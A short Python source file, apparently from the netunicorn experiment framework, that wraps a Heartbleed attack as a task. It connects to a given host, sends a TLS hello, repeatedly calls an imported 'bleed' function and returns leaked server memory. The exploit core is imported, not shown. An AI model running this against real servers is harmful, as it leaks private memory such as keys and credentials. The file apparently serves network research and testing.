import time
from enum import Enum
from netunicorn.base.task import Task
from netunicorn.base.task import Success, Failure
from .heartbleeder import connect, send_hello, bleed


class TLSVersion(Enum):
    TLS_1_0 = 0x01
    TLS_1_1 = 0x02
    TLS_1_2 = 0x03
    TLS_1_3 = 0x04


class Heartbleed(Task):
    def __init__(
        self,
        dst_host: str,
        dst_port: int,
        src_port: int = None,
        count: int = 1,
        sleep_seconds: int = 0,
        tls_version: TLSVersion = TLSVersion.TLS_1_0,
    ):
        self.host = dst_host
        self.port = dst_port
        self.src_port = src_port
        self.count = count
        self.sleep_seconds = sleep_seconds
        self.tls_version = int(tls_version.value)
        super().__init__()

    def run(self):
        connection = connect(self.host, self.port, src_port=self.src_port)
        time.sleep(1)
        send_hello(connection, self.tls_version)
        time.sleep(1)
        result = ""
        for i in range(0, self.count):
            answer = bleed(connection, self.tls_version)
            if answer is not None:
                result += answer
            time.sleep(self.sleep_seconds)
        resulting_type = Success if len(result) > 0 else Failure
        return resulting_type(result)
